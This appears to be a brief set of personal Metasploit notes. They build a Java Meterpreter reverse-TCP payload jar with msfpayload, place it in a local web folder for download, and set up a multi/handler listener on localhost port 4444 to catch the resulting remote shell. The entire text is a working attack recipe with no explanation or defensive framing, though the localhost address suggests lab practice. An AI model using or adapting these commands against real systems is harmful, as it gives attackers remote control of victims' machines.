./msfpayload java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > met.jar
cp met.jar /Users/alvaro/Sites (http://localhost/~alvaro/met.jar)

use exploit/multi/handler
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST  127.0.0.1
set LPORT 4444
exploit

